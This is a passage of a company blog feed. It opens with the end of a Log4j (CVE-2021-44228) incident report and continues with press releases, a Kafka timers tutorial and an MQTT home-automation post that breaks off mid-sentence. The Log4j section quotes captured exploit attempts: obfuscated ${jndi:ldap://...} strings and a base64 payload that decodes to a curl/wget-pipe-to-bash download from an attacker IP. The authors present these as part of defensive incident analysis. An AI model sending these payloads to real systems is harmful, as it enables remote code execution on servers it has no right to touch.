\\"#cve-2021-44228\\"\\n  slack_emoji_override: \\":unlock:\\"\\n  slack_msg_color: warning\\n  slack_title: Security RCE attempt for CVE-2021-44228\\n```\\nWe quickly then began to receive alerts of probing attempts across our environments.\\n\\n\\n![](/img/blog/log4j/03-elastalert.png)\\n\\nThe following alerts are **unsuccessful** exploit attempts our infrastructure.\\n\\nLet\u2019s take a closer look at some of these exploit attempts to see if we can learn anything..\\n\\n```bash\\n[2021-12-10T14:05:52.612 Z] \\"GET / HTTP/1.1\\" 307 - 0 0 0 - \\"45.155.205.233\\" \\"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}\\" \\"34b61b2d-28f6-4e89-9baf-7cd3b4e71698\\" \\"54.217.173.83:443\\" \\"-\\"\\n```\\nThis request was hitting our public API gateway with a base64 encoded payload. Decoding this payload we can see what the actor was trying to accomplish:\\n\\nbase64\\n```\\nKGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==\\n```\\n\\nbase64 decoded\\n```\\n(curl -s 45.155.205.233:5874/54.217.173.83:443||wget -q -O- 45.155.205.233:5874/54.217.173.83:443)|bash\\n```\\n\\nIf this attack was successful, we can see that the actor is attempting to download a malicious exploit first with `curl`, then attempt with `wget` and then execute with the downloaded payload with bash. If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from [Falco](https://github.com/falcosecurity/falco). In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack.\\n\\nLooking at more attempts, we started to see probing attempts using a 3rd party service using [Interactsh](https://github.com/projectdiscovery/interactsh).\\n\\n```bash\\n16/Dec/2021:06:11:07 +0000] \\"GET /?x=${jndi:ldap://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1\\" 302 0 \\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}\\" \\"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}\\" 685 0.015 [products-developer-portal-8080] 100.98.133.224:8080 0 0.014 302 548d1132926fa0bc9904e12523d2f250 [${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}, 173.249.19.100]\\n```\\n\\nWe see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable.\\n\\n```bash\\n[2021-12-14T22:57:36.722Z] \\"GET / HTTP/1.1\\" 307 - 0 0 0 - \\"51.105.55.17\\" \\"/${jndi:ldap://45.83.193.150:1389/Exploit}\\" \\"7c9223d6-2c81-491d-8564-10742cc90a9c\\" \\"54.75.196.220\\" \\"-\\"\\n```\\n\\nIn our Tokyo region, we started to see a lot of requests from `x00.it` domain.\\n\\n```bash\\n[14/Dec/2021:17:37:59 +0000] \\"GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1\\" 401 39 \\"${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_Referer.log4jdns.x00.it/}\\" \\"${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}\\" 4496 0.255 [monitoring-mki-lab-grafana-80] 100.115.164.63:3000 39 0.001 401 d7fa702ee8cc73793707ca6720c57639 [194.5.73.6]\\n```\\n\\nIn the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve.\\n\\n## Monday\\n\\n### Docker Vulnerability Scans\\n\\nNext, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from [this resource](https://github.com/cisagov/log4j-affected-db) that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with [kubectl](https://github.com/kubernetes/kubectl) and [Trivy](https://github.com/aquasecurity/trivy), a scanner for vulnerabilities in container images.\\n\\nFirst, we built a small POC to ensure that Trivy can identify the CVE-2021-44228.\\n\\n```bash\\n\u276f\u276f\u276f brew install aquasecurity/trivy/trivy\\n\u276f\u276f\u276f trivy image birdyman/log4j2-demo:1.0.0-12 | grep CVE-2021-44228\\n| org.apache.logging.log4j:log4j-api                     | CVE-2021-44228   | CRITICAL | 2.10.0            | 2.15.0                         | Remote code injection in Log4j                                                  |\\n```\\n\\nNow that we know Trivy works, let\u2019s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE.\\n\\n`trivy-scan-cve.sh CVE-2021-44228`\\n```bash\\n#!/usr/bin/env bash\\n\\nVULN=$1\\n\\necho \\"Scanning $1...\\"\\n\\nimgs=`kubectl get pods -A -o jsonpath=\'{range .items[*]}{.spec.containers[*].image}{\\" \\"}\' | tr \\" \\" \\"\\\\n\\" | sort -u`\\nfor img in ${imgs}; do\\n  echo \\"scanning ${img}\\"\\n  result=`trivy image --severity CRITICAL ${img}`\\n  if echo ${result} | grep -q \\"$1\\" ; then\\n    echo -e \\"${img} is vulnerable, please patch!\\"\\n  fi\\ndone\\n```\\n\\nWe ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods.\\n\\n### Monitoring Vendors\\n\\nIt is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required.\\n\\n## What worked well and could be improved\\n\\nDuring this incident management we have gathered great learnings in the way.\\n\\nFirst of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process.\\n\\nSecond, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry.\\n\\n## Staying secure\\n\\nAll in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment."},{"id":"ckh-iod-wg2-public-cloud","metadata":{"permalink":"/blog/ckh-iod-wg2-public-cloud","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-12-01-ckh-iod-wg2-public-cloud.md","source":"@site/../blog/2021-12-01-ckh-iod-wg2-public-cloud.md","title":"CKH IOD selects Working Group Two for public cloud core network","description":"CKH IOD migrates its core network to the cloud \u2013 delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS","date":"2021-12-01T12:00:00.000Z","formattedDate":"December 1, 2021","tags":[{"label":"press release","permalink":"/blog/tags/press-release"},{"label":"telco","permalink":"/blog/tags/telco"}],"readingTime":3.725,"hasTruncateMarker":true,"authors":[{"name":"Erlend Prestgard","title":"CEO","url":"https://www.linkedin.com/in/erlend-prestgard-ab47101/","imageURL":"/img/author-photos/ep.jpg","key":"erlend-prestgard"}],"frontMatter":{"slug":"ckh-iod-wg2-public-cloud","title":"CKH IOD selects Working Group Two for public cloud core network","description":"CKH IOD migrates its core network to the cloud \u2013 delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS","date":"2021-12-01:12:00:00","tags":["press release","telco"],"authors":"erlend-prestgard"},"prevItem":{"title":"Zero-day vulnerabilities - Log4j","permalink":"/blog/log4j-security-vulnerability"},"nextItem":{"title":"Mitsui Knowledge Industry (MKI) to develop private networks business","permalink":"/blog/mitsui-knowledge-industry-mki-private-networks-business"}},"content":"<img src=\\"/img/ckh.png\\" alt=\\"ckh\\" width=\\"300\\"/>\\n\\n- As an industry-first, CKH IOD migrates its core network to the cloud \u2013 delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS\\n- A cloud-based core network brings radical simplification, cost efficiency and a platform to leverage a developer community \u2013 to drive innovation and capitalize on disruptive technologies\\n\\n\x3c!--truncate--\x3e\\n\\n**Oslo/London, 1 December, 2021** \u2013 CKH Innovations Opportunities Development (CKH IOD) has entered into a contract with Working Group Two to move its core network to the public cloud. CKH IOD, a telecoms unit and international development hub of CK Hutchison, via a fully managed SaaS by Working Group Two, will deploy its mobile core network on Amazon Web Services (AWS). The agreement means that CKH IOD, and its MVNO, IoT and Private Network customers, can achieve radical simplification, speed up innovation, explore new revenue streams and get to market faster.\\n\\nCKH IOD will leverage Working Group Two\u2019s platform to deliver services across the CK Hutchison telecoms footprint in Europe, Asia and its wider international partners.\\n\\nBy evolving to a software-defined network, CKH IOD radically consolidates its vendor relationships and associated complexities. Working Group Two\u2019s fully managed mobile core network also automates operations and maintenance to deliver a more cost-efficient service.\\n\\n\u201cOur collaboration with Working Group Two to deploy our core network on the public cloud delivers simplicity, improved operational efficiency and the ability to quickly develop new initiatives to meet market needs, with particular focus on the MVNO, IoT and Private Network space. It\u2019s about achieving scale and the highest levels of security while reducing complexity \u2013 to the benefit of our customers and ultimately, end-users in our markets,\u201d says Joe Parker, CEO of CKH IOD.\\n\\n\u201cCKH IOD earns a first-mover advantage by deploying a core built leveraging the webscale playbook. Being built on the cloud and delivered as-a-service, this core enables simplicity, cost efficiency and a continuous evolution of capabilities and features \u2013 with no end-of-life. In addition, they get access to a community of partners that build and integrate into the cloud core, giving a vastly enhanced pace of innovation. Under the umbrella of \u201ceverything as-a-service\u201d the time has come to include the core network. We are incredibly excited to announce this landmark agreement,\u201d says Erlend Prestgard, CEO of Working Group Two.\\n\\nWorking Group Two leverages the proven infrastructure and breadth of services from AWS to deploy a cloud-native core network.\\n\\n\u201cWorking Group Two is a pioneer in building mobile core networks with much of the same philosophy that AWS builds infrastructure. Scalable, secure, consistent and API-driven, delivering the promise of efficiency and rapid innovation at scale,\u201d says David Brown, VP and GM of Amazon EC2.\\n\\n\u201cWith CKH IOD deciding to host its core network on the public cloud and have it fully managed by a third party under a managed SaaS model, we are witnessing a significant technology shift. By opting for a full set of capabilities from AWS, CKH IOD and Working Group Two can leverage the full benefits of the public cloud, including opening up for new business models. This will allow CKH IOD to scale their services and offerings with superior visibility and control. They will be stimulating a rapid pace of innovation with the highest levels of security and performance,\u201d says Fabio Cerone, Managing Director EMEA, Telco Business Unit at AWS.\\n\\n### About CKH Innovations Opportunities Development\\nCKH Innovations Opportunities Development is a telecom unit and international development hub of CK Hutchison, creating international and global technological innovations that are built on one of CK Hutchison\u2019s strongest assets, our mobile networks. We offer customised global mobile communications and data solutions that create new digital value and unprecedented opportunities for business. Our collaborative approach combined with our world-class network and experience means we are best placed to help our customers design, adapt, develop and scale solutions faster. Read more at https://www.ckhiod.com\\n\\n### About Working Group Two\\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at https://wgtwo.com\\n\\n### For more information\\nErlend Prestgard, CEO, Working Group Two, +47 4542 9555, erlend@wgtwo.com"},{"id":"mitsui-knowledge-industry-mki-private-networks-business","metadata":{"permalink":"/blog/mitsui-knowledge-industry-mki-private-networks-business","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-06-01-mitsui-knowledge-industry-mki-private-networks-business.md","source":"@site/../blog/2021-06-01-mitsui-knowledge-industry-mki-private-networks-business.md","title":"Mitsui Knowledge Industry (MKI) to develop private networks business","description":"Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS","date":"2021-06-01T12:00:00.000Z","formattedDate":"June 1, 2021","tags":[{"label":"press release","permalink":"/blog/tags/press-release"},{"label":"mki","permalink":"/blog/tags/mki"},{"label":"private networks","permalink":"/blog/tags/private-networks"}],"readingTime":2.395,"hasTruncateMarker":true,"authors":[{"name":"Naoya Ori","title":"APAC Sales & Japan Country Manager","url":"https://www.linkedin.com/in/naoya-ori-093482/","imageURL":"/img/author-photos/no.jpg","key":"naoya-ori"}],"frontMatter":{"slug":"mitsui-knowledge-industry-mki-private-networks-business","title":"Mitsui Knowledge Industry (MKI) to develop private networks business","description":"Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS","date":"2021-06-01:12:00:00","tags":["press release","mki","private networks"],"authors":"naoya-ori"},"prevItem":{"title":"CKH IOD selects Working Group Two for public cloud core network","permalink":"/blog/ckh-iod-wg2-public-cloud"},"nextItem":{"title":"Kafka timers","permalink":"/blog/kafka-timers"}},"content":"<img src=\\"/img/mki.png\\" alt=\\"mki\\" width=\\"300\\"/>\\n\\n\u2014 Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS \u2014\\n\\nCEO Erlend Prestgard of Working Group Two As, Oslo, Norway and President Kengo Asano of Mitsui Knowledge Industry Co., Ltd. Minato-ku, Japan, agreed on an MoU on providing WG2\u2019s fully-managed Mobile Core NW SaaS product to accelerate the Private Networks business in the Japanese market.\\n\\n\x3c!--truncate--\x3e\\n\\nIn the Japanese market, there is a clear interest in Private NWs due to the regulatory setup of Private LTE and Local 5G. However, there are complex issues to overcome and Private NWs require professional knowledge to acquire a radio license, to design and operate the Core Network, and to optimize the Radio Network, all with reasonable cost. The MKI-WG2 agreement solves these problems:\\n\\n- One-stop solution from client\u2019s radio license acquisition to operational support\\n- WG2\u2019s Mobile Core NW built with a web-scale IT approach to simplify financial and operational aspects of the mobile system\\n- Parties will encourage and enable the Private NW operators to create new business\\n- MKI will provide WG2\u2019s Mobile Core SaaS as part of its offering as well as reselling it to other integrators to create a larger ecosystem\\n- MKI has radio network knowledge, and WG2 provides Mobile Core as a service (SaaS) that radically improves the cost model. With this partnership, both parties will combine those strengths and lift the Private NWs business to the next level.\\n\\n> \u201cTogether with MKI, we make the journey of launching feature-rich private networks simple and affordable. MKI\u2019s strong local presence and Working Group Two\u2019s ability to distill complex core networks into simple-to-use APIs allow customers to launch full-service mobile networks at a small scale \u2013 with market-leading affordability,\u201d said Erlend Prestgard, CEO and Co-Founder of Working Group Two.\\n\\n## About Working Group Two (wgtwo)\\nWG2 has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, WG2\u2019s innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all G\u2019s.\\n\\nOur mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services.\\n\\nWG2 is an Advanced Technology Partner of AWS: https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As\\n\\nWG2 Website: https://wgtwo.com\\n\\n### About Mitsui Knowledge Industry (MKI)\\n\\nUnder the slogan \u201cUnite Knowledge, Ignite the Future\u201d, Mitsui Knowledge Industry Co., Ltd. (MKI)  has been creating IT strategies and supporting the digital transformation of its clients as their strategic business partner specializing mainly in information and communication technology. By utilizing its wealth of \u201cKNOWLEDGE\u201d accumulated through its long experience in technological development and innovation continuing for over half a century, MKI remains consistent in its pursuit to live up to the high expectations of its customers as their most reliable \u201cvalue creator\u201d.\\n\\nMKI Website: https://www.mki.co.jp/english/about/\\n\\nPublished: June 1, 2021"},{"id":"kafka-timers","metadata":{"permalink":"/blog/kafka-timers","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-02-28-kafka-timers.md","source":"@site/../blog/2021-02-28-kafka-timers.md","title":"Kafka timers","description":"A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations","date":"2021-02-28T00:00:00.000Z","formattedDate":"February 28, 2021","tags":[{"label":"kafka","permalink":"/blog/tags/kafka"},{"label":"timer","permalink":"/blog/tags/timer"},{"label":"stateless","permalink":"/blog/tags/stateless"}],"readingTime":4.61,"hasTruncateMarker":true,"authors":[{"name":"Sergey Zyrianov","title":"Tech Lead for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/sergey-zyrianov-8a7ab34/","imageURL":"/img/author-photos/sz.jpg","key":"sergey-zyrianov"}],"frontMatter":{"slug":"kafka-timers","title":"Kafka timers","date":"2021-02-28T00:00:00.000Z","tags":["kafka","timer","stateless"],"authors":"sergey-zyrianov"},"prevItem":{"title":"Mitsui Knowledge Industry (MKI) to develop private networks business","permalink":"/blog/mitsui-knowledge-industry-mki-private-networks-business"},"nextItem":{"title":"Changing the color of your bulbs: The fancy way","permalink":"/blog/mqtt-event-bridge"}},"content":"A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations\\nthat provide a timer facility. Most of them are in memory and will lose scheduled timers should the application crash.\\nIn this blog we discuss durable Kafka timers that do not depend on in memory state. By design\\nwe shall assume 1 second resolution of these timers.\\n\\n\x3c!--truncate--\x3e\\n\\nBefore taking on timers let\'s cover some Kafka basics.\\n\\n## Kafka concepts\\nThere are a few Kafka concepts in play to simulate timers - Kafka topic, Kafka stream, Kafka streams library.\\nWhere *topic* is append only log of events, *stream* is a cache of N most recent events on the *topic*,\\nand the *streams library* is a software library implementing the concept of the *stream*.\\n\\nA kafka topic resides inside the Kafka servers, but Kafka streams library keeps track of a topic\'s most recent\\nevents on the application side - the stream. The stream is a key/value cache with random read access unlike\\nappend only topic log. Key/value cache is not the only thing the library provides. It can also join\\nthe streams. When an event and its key appear on a stream, the library looks up the same key in the other streams participating in the join.\\nIt is using key/value cache associated with each stream and gives the result to the application.\\nThe result will have the present event enriched with the matched past events from the joined streams.\\nJoining two streams will yield the timer callback. Let\'s see how.\\n\\n## Implementation\\nSince it is Kafka, timer expiration shall result in an event posted on a topic of user\'s choice at the right time.\\nThis event is delayed until due time by joining two streams: *oscillator* and *timer-request*. Callback\\nevent is pushed to *timer-request* topic with key equal to the expiration timestamp. Oscillator topic\\nis the clock dial counting seconds since UNIX epoch in real time. At some point it will get to the second\\nwhich is equal to the key on *timer-request* topic, and the join will come up with the callback event.\\n\\nAn excellent summary on \\"timer wheel\\" and other timer algorithms can be found in this linux kernel [thread](https://lwn.net/Articles/156329/).\\nOur implementation of timers using Kafka resembles the \\"timer wheel\\" algorithm with a bucket on each second to keep callbacks.\\n*Oscillator* topic models rotating clock dial, *timer-request* is bucketing callbacks by the expiration timestamp, and join of these two\\ncontains content of the expired bucket with all the callbacks in it.\\n\\n![](/img/blog/kafka-timers/kt.png)\\n\\nThere are two Kafka applications running together to service these topics:\\n* Oscillator\\n* Futures\\n\\n### Oscillator\\n\\nWith the resolution of 1 second oscillator keeps pushing *oscillator* topic:\\n```kotlin\\nwhile (running) {\\n    val nowSeconds = System.currentTimeMillis() / 1000L\\n    while (timestampSeconds < nowSeconds) {\\n        timestampSeconds++\\n        KafkaProducers.send(\\n            \\"oscillator\\",\\n            timestampSeconds.toString(),\\n            \\"1\\"\\n        )\\n    }\\n    Thread.sleep(200)\\n}\\n\\n```\\n\\n### Futures\\n\\nWhen requesting a timer by pushing *timer-request* topic, the user provides a callback structure\\nused to dispatch timer event:\\n\\n```\\nmessage Future {\\n    string callBackTopic = 1;\\n    string callBackKey = 2;\\n    bytes callBack = 3;\\n}\\n```\\n\\nJoining two streams on the key equal to the UNIX second will give all expired timers, and\\ntheir callback coordinates.\\n\\nFirst, setup a join with *WINDOW_SIZE* large enough to cover the longest timer duration\\n\\n```kotlin\\nval oscillator = builder.stream<String, String>(\\"oscillator\\")\\nval timerRequest = builder.stream(\\"timer-request\\", Consumed.with(Serdes.String(), FutureSerde()))\\nval timeoutEvents =\\n    oscillator.join(\\n            timerRequest,\\n            { _: String?, future: Future -> future },\\n            JoinWindows.of(WINDOW_SIZE),\\n            StreamJoined.with(\\n                    Serdes.String(),\\n                    Serdes.String(),\\n                    FutureSerde()\\n            ).withThisStoreSupplier(\\n                    Stores.persistentWindowStore(\\n                            \\"join-this-store\\",\\n                            WINDOW_SIZE.plusMinutes(30),\\n                            WINDOW_SIZE,\\n                            true\\n                    )\\n            ).withOtherStoreSupplier(\\n                    Stores.persistentWindowStore(\\n                            \\"join-other-store\\",\\n                            WINDOW_SIZE.plusMinutes(30),\\n                            WINDOW_SIZE,\\n                            true\\n                    )\\n            )\\n    )\\n```\\n\\nSecond, kick of the processing loop looking for expired timers\\n\\n```kotlin\\ntimeoutEvents.process(\\n        ProcessorSupplier {\\n            object : Processor<String, Future> {\\n                override fun init(context: ProcessorContext) {}\\n                override fun process(key: String, value: Future) {\\n                    KafkaProducers.send(Topic.valueOf(value.callBackTopic),\\n                            value.callBackKey,\\n                            value.callBack.toByteArray()\\n                    )\\n                    Metrics.timerFired(value.callBackTopic)\\n                }\\n\\n                override fun close() {}\\n            }\\n        }\\n)\\n\\n```\\n### Cancelling a timer\\nThere is no way to cancel these timers as events can\'t be easily removed from the Kafka stream.\\nStill, it is possible to ignore timer events by using a token in callback request, and a variable\\nin timer receiver state. When scheduling a timer the receiver puts the same token in two places:\\n\\n* callback struct it publishes on the *timer-request* topic\\n* internal variable timerToken\\n\\nAs timer fires receiver compares value in timerToken and in the callback event. Based on the result it\\ndraws a conclusion if timer is to be ignored or not. All it has to do to cancel a timer is to reset\\nvalue in its timerToken variable.\\n\\nSince normally Kafka does \\"at least once\\" delivery it is a good idea to reset the timerToken immediately\\nafter notification event.\\n\\n### What to worry about\\n\\nKafka streams library is using local disk storage to keep the cache. The storage shall be large enough to host\\nall timer requests based on the product of *timer-request* topic retention, callback size and timer scheduling rate.\\nThankfully Kafka is well-equipped to deal with this sort of troubles.\\n\\nOscillator must keep ticking otherwise timers will stop coming. Make sure to have\\nmetrics/alarms in place to stay on top of Oscillator health. Deploy few of them for redundancy having in\\nmind the extra load they will generate on timer users.\\n\\n## Conclusion\\n\\nThere are many options to export application state to the data tier layer. Timers are often part of that\\nstate. Above we showed how to apply Kafka primitives to achieve a goal of making application \\"stateless\\" even\\nif the state is using timers. It has its costs and benefits."},{"id":"mqtt-event-bridge","metadata":{"permalink":"/blog/mqtt-event-bridge","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-01-07-mqtt-event-bridge.md","source":"@site/../blog/2021-01-07-mqtt-event-bridge.md","title":"Changing the color of your bulbs: The fancy way","description":"last hackathon i did setup a mqtt integration towards wgtwo\'s apis to enable call notifications via my ikea tr\xe5dfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.","date":"2021-01-07T00:00:00.000Z","formattedDate":"January 7, 2021","tags":[{"label":"api","permalink":"/blog/tags/api"},{"label":"grpc","permalink":"/blog/tags/grpc"},{"label":"mqtt","permalink":"/blog/tags/mqtt"},{"label":"node-red","permalink":"/blog/tags/node-red"}],"readingTime":5.54,"hasTruncateMarker":true,"authors":[{"name":"Gunnar Inge G. Sortland","title":"Tech Lead for Ecosystem","url":"https://www.linkedin.com/in/gunnaringe/","imageURL":"/img/author-photos/gis.jpg","key":"gunnar-inge"}],"frontMatter":{"slug":"mqtt-event-bridge","title":"Changing the color of your bulbs: The fancy way","date":"2021-01-07T00:00:00.000Z","tags":["api","grpc","mqtt","node-red"],"authors":["gunnar-inge"]},"prevItem":{"title":"Kafka timers","permalink":"/blog/kafka-timers"},"nextItem":{"title":"Forbidden lore: hacking DNS routing for k8s","permalink":"/blog/forbidden-lore-hacking-dns-routing-for-k8s"}},"content":"last hackathon i did setup a mqtt integration towards **wgtwo**\'s apis to enable call notifications via my ikea tr\xe5dfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.\\n\\n\x3c!--truncate--\x3e\\n\\n![](/img/blog/mqtt-event-bridge/animation.webp)\\n\\n---\\n\\nThere are a variety of events generated by **wgtwo**\u2019s systems for subscriptions on the platform. This includes information such as call events, SMS sent to and from a subscription (including content), voicemail events, location events, and more.\\n\\nWe offer a [gRPC API](https://docs.wgtwo.com/events/listen-for-events/) which enables developers to listen to a selection of these events.\\n\\nI wanted to make a super simple setup so that I could configure home automation rules, e.g. **\\"If someone calls me, make my IKEA bulb change color to notify me\\"** or **\\"If I send myself a SMS with \'Leaf ON\', turn on the heater in my car\\"**.\\n\\nA lot of home automation tools, such as Node-RED and Home Assistant have great MQTT support, so instead of writing a native gRPC integration I wanted to make a more flexible solution by offering these events over MQTT. This way, anyone using a home automation tool with MQTT support can integrate with our platform easily.\\n\\nDuring our last hackathon I built a simple bridge between our events API and MQTT. I wrote this bridge in Go, using [Mochi MQTT](https://github.com/mochi-co/mqtt) as an embedded MQTT server.\\n\\nThe flow is shown in this sketch:\\n![](/img/blog/mqtt-event-bridge/sketch.svg)\\n\\nThe way it works is quite simple: You log in to the service using our OAuth solution. You then grant the service access to fetch events on your behalf. The service will then generate a username and password for you.\\n\\nThe service will fetch events for all subscribers that have enabled it and publish these to the MQTT server with topic `{phone number}/events/{type}`. With the generated credentials, you may then subscribe to these events.\\n\\nNote that nothing of this requires any setup on your phone, so it would work equally well on a 20-30 year old Nokia phone.\\n\\nAs I\'ll explain in more detail below, I did setup a quick Node-RED flow to consume these events as shown in the video below:\\n\\n## Video\\n\\n<video width=\\"100%\\" controls>\\n  <source src={require(\'../website/static/video/blog/mqtt-event-bridge/calling.mp4\').default} type=\\"video/mp4\\" />\\n  Your browser does not support the video tag.\\n</video>\\n\\nHere you can see that:\\n1. The light changes to cool white when the call is initiated (phone not yet ringing)\\n2. It turns pink when the phone is ringing\\n3. It turns red when we pick up the call\\n4. It returns to normal after the call has ended\\n\\n## Connecting to **wgtwo**\'s API\\n\\nWe will use a normal OAuth2 authorization code grant for logging in to our service.\\n\\nTo handle this, we used the module `github.com/markbates/goth` with the following settings:\\n\\n```go\\nimport \\"golang.org/x/oauth2\\"\\n\\nconst endpointProfile string = \\"https://id.wgtwo.com/userinfo\\"\\n\\nvar Endpoint = oauth2.Endpoint{\\n  AuthURL:  \\"https://id.wgtwo.com/oauth2/auth\\",\\n  TokenURL: \\"https://id.wgtwo.com/oauth2/token\\",\\n}\\n```\\n\\nWhen logging in, the user will be asked to consent to the following scopes:\\n- phone: Allowing the service to fetch the user\u2019s phone number\\n- offline_access: Giving the service a refresh token\\n- events.voice.subscribe: Allow the service to see all call events\\n- events.voicemail.subscribe: Allow the service to see if a voicemail has been left\\n- events.sms.subscribe: Allow the service to get a copy of every SMS sent and received\\n\\nAll the events you have consented to share with the service will be stored in the service\'s queue.\\n\\n```\\nsms events        \u2500\u256e\\nvoice events      \u2500\u253c\u2500\u25b7  queue  \u25c1\u2500\u2500 gRPC API\\nvoice mail events \u2500\u256f\\n```\\n\\nThis queue can be consumed by using the events streaming API ([docs](https://docs.wgtwo.com/events/listen-for-events/)), which requires the service to use the OAuth2 client credentials grant flow.\\n\\nEvents will be shared with the service as long as there exists an active consent.\\n\\nWe then initiate the server side stream to fetch the events:\\n```go\\nrequest := &pb.SubscribeEventsRequest{\\n  Type:          []pb.EventType{pb.EventType_VOICEMAIL_EVENT},\\n  StartPosition: &pb.SubscribeEventsRequest_StartAtOldestPossible{},\\n  ClientId:      uuid.New().String(),\\n  QueueName:     \\"wgtwo-mqtt-demo\\",\\n  DurableName:   \\"wgtwo-mqtt-demo\\",\\n  MaxInFlight:   10,\\n  ManualAck: &pb.ManualAckConfig{\\n     Enable:  true,\\n     Timeout: ptypes.DurationProto(10 * time.Second),\\n  },\\n}\\nr, err := c.Subscribe(context.TODO(), request)\\n\\nfor {\\n  response, err := r.Recv()\\n  if err == io.EOF || err != nil {\\n     break\\n  }\\n\\n  event := response.Event\\n  // PUBLISH EVENT TO MQTT SERVER ON TOPIC {event owner}/events/{type}\\n}\\n```\\n\\n## Connecting to our new MQTT service\\nThe service has a very pretty landing page (Disclaimer: I am not a designer).\\n\\n![landing page](/img/blog/mqtt-event-bridge/landing-page.png)\\n\\nClicking this button takes you to the login page:\\n\\n<div class=\\"post-images halves\\" markdown=\\"1\\">\\n![](/img/blog/mqtt-event-bridge/login-enter-phonenumber.png)\\n![](/img/blog/mqtt-event-bridge/login-pin.png)\\n</div>\\n\\n\u2026 and then asks you to allow our service to get your voice event and new voicemails. As I am only interested in the voice events here, I\u2019ll only grant that.\\n\\nAs this is an experimental app which hasn\u2019t been approved by anyone, our login page will give you a clear warning about trusting this.\\n\\n<div class=\\"post-images single\\" markdown=\\"1\\">\\n![](/img/blog/mqtt-event-bridge/login-consent.png)\\n</div>\\n\\nWhen that is done, it returns to our app showing this beautiful UI (still not a designer):\\n\\n![](/img/blog/mqtt-event-bridge/success.png)\\n\\nThe generated credentials will allow you to listen any topic matching `{phone number}/#`.\\n\\nThe following is the output from pasting that 